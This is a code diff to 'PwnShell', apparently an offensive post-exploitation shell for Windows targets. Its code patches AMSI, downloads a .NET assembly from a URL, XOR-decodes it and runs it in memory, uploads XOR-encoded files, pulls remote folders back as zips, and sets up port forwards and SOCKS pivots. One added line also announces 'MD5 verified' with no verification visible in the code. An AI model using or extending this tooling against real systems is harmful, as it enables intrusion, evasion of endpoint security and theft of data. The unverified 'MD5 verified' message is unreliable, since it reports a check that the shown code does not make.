@@ -43,7 +43,6 @@ from .commands import (
     _xor_key, build_amsi_patch,
     new_HostWriter, import_HostWriter,
     call_XorEnc, import_XorEnc,
-    _importPathFix, _new_PathFix,
     # dll_import generated variables:
     _import_LoadLibrary,    _call_LoadLibrary,
     _import_GetProcAddress, _call_GetProcAddress,
@@ -166,8 +165,9 @@ class PwnShell:
             self._completer = WordCompleter(_COMPLETIONS, ignore_case=True)
 
     def __del__(self):
-        self.stop_log()
-        if self.socks_server:
+        if getattr(self, "stdout_log", None):
+            self.stop_log()
+        if getattr(self, "socks_server", None):
             self.socks_server.stop()
 
     # ── logging ───────────────────────────────────────────────────────────────
@@ -271,8 +271,9 @@ class PwnShell:
                         clean_cmd = strip_ansi(cmd)
                         self.stdout_log.write(f"PS {self.cwd}> {clean_cmd}\n".encode())
                         self.stdout_log.flush()
-                    self.run_with_interrupt(cmd, self.write_line)
-                    self.update_cwd()
+                    interrupted = self.run_with_interrupt(cmd, self.write_line)
+                    if not interrupted:
+                        self.update_cwd()
 
     # ── prompt / input ────────────────────────────────────────────────────────
     def update_cwd(self):
@@ -454,12 +455,30 @@ class PwnShell:
             for f in forwards:
                 self.write_info(f"    ID: {f['id']} | Bind: {f['bind']} -> Target: {f['target']}")
             print()
-        elif len(args) >= 2:
+        elif args[0].lower() == "stop":
+            if len(args) != 2:
+                self.write_warning("Usage: !portfwd stop <ID|all>")
+                return
+            if args[1].lower() == "all":
+                stopped = self.port_forwarder.stop_all()
+                self.write_info(c(Y, f"  [*] Stopped {stopped} port forward(s)."))
+                return
+            try:
+                fid = int(args[1])
+            except ValueError:
+                self.write_warning("Port forward ID must be an integer or 'all'.")
+                return
+            if self.port_forwarder.stop_forward(fid):
+                self.write_info(c(Y, f"  [*] Port forward {fid} stopped."))
+            else:
+                self.write_warning(f"Port forward {fid} not found.")
+        elif len(args) == 2:
             try:
                 lport = int(args[0])
-                rhost, rport = args[1].split(":")
+                rhost, rport = args[1].rsplit(":", 1)
                 fid = self.port_forwarder.start_local_forward(lport, rhost, int(rport))
-                self.write_info(c(G, f"  [+] Port forward created (ID: {fid}): 127.0.0.1:{lport} -> {rhost}:{rport}"))
+                created = next(f for f in self.port_forwarder.list_forwards() if f["id"] == fid)
+                self.write_info(c(G, f"  [+] Port forward created (ID: {fid}): {created['bind']} -> {created['target']}"))
             except Exception as e:
                 self.write_error(f"Failed to create port forward: {e}")
         else:
@@ -645,13 +664,14 @@ class PwnShell:
             f"$buf = (New-Object Net.WebClient).DownloadData({url})",
             f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
             f"$out = {new_HostWriter}",
+            "$oldOut = [Console]::Out; $oldErr = [Console]::Error",
             f"[Console]::SetOut($out); [Console]::SetError($out)",
             f"[void]$dll.EntryPoint.Invoke($null, [object[]](,[string[]]({argv})))" if args[1:] else
             "if ($dll.EntryPoint.GetParameters().Length -eq 0) { [void]$dll.EntryPoint.Invoke($null, $null) } else { [void]$dll.EntryPoint.Invoke($null, [object[]](,[string[]]@())) }",
-            "[Console]::SetOut([IO.StreamWriter]::Null)",
-            "[Console]::SetError([IO.StreamWriter]::Null)",
+            "[Console]::SetOut($oldOut)",
+            "[Console]::SetError($oldErr)",
             "$out.Dispose()",
-            "Remove-Variable @('buf','dll','out')"
+            "Remove-Variable @('buf','dll','out','oldOut','oldErr')"
         ]
         for cmd in cmds:
             logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)
@@ -691,6 +711,8 @@ class PwnShell:
                 self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
         else:
             unxor = True
+        if len(args) not in (1, 2):
+            self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
         src = Path(args[0])
         dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
         try:
@@ -710,6 +732,7 @@ class PwnShell:
         total = 0
         self.write_info(f"  [~] Uploading -> {c(C, str(tmpfn))}")
         self.run_sync(import_XorEnc)
+        self.run_sync(f'[System.IO.File]::WriteAllBytes("{tmpfn_pde}", [byte[]]@())')
         for chunk in chunks(buf, 65536):
             chunk_len = len(chunk)
             pct = int((total + chunk_len) * 100 // len(buf)) if len(buf) > 0 else 100
@@ -809,7 +832,7 @@ class PwnShell:
         if not dst.parent.exists(): 
             os.makedirs(dst.parent, exist_ok=True)
 
-        is_dir = self.run_sync(f"Test-Path -LiteralPath '{src_ps}' -PathType Container") == "True"
+        is_dir = self.run_sync(f"Test-Path -LiteralPath '{src_ps}' -PathType Container").strip().lower() == "true"
         if is_dir:
             if not dst.name.lower().endswith(".zip"): 
                 dst = dst.parent / f"{dst.name}.zip"
@@ -822,25 +845,12 @@ class PwnShell:
             tmpdir    = tmpdir_validated
             tmpnm     = secrets.token_hex(8)
             tmpfn     = tmpdir + tmpnm
-            tmpdir_ps = self._pse(tmpdir)
             tmpfn_ps  = self._pse(tmpfn)
-            tmpfn_pde = self._pde(tmpfn)
 
             ps = f"""
 Add-Type -AssemblyName "System.IO.Compression.FileSystem"
-New-Item -Path '{tmpdir_ps}' -ItemType Directory -Name '{tmpnm}' | Out-Null
-Get-ChildItem -Force -Recurse -LiteralPath '{src_ps}' | ForEach-Object {{
-    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
-        try {{
-            $d = $_.FullName.Replace('{src_ps}', '')
-            Copy-Item -ErrorAction SilentlyContinue -Force -LiteralPath $_.FullName "{tmpfn_pde}\\$d"
-        }} catch {{ Write-Warning "skipping $d" }}
-    }}
-}}
-{_importPathFix}
-[IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn_ps}', '{tmpfn_ps}.zip',
-    [IO.Compression.CompressionLevel]::Fastest, $true, ${_new_PathFix})
-Remove-Item -Recurse -Force -LiteralPath '{tmpfn_ps}'
+[IO.Compression.ZipFile]::CreateFromDirectory('{src_ps}', '{tmpfn_ps}.zip',
+    [IO.Compression.CompressionLevel]::Fastest, $false)
 """
             self.run_with_interrupt(ps, self.write_line)
             src    = tmpfn + ".zip"
@@ -902,5 +912,8 @@ Remove-Item Function:Download-Remote
         self.write_info(f"  [+] Writing {c(G,str(dst.resolve()))}")
         try:
             with open(dst,"wb") as f: f.write(buf[:-32])
+            self.write_info(c(G, "  [+] Download complete — MD5 verified."))
         except IOError as e:
             self.write_error(str(e))
+        finally:
+            buf[:] = b'\x00' * len(buf)
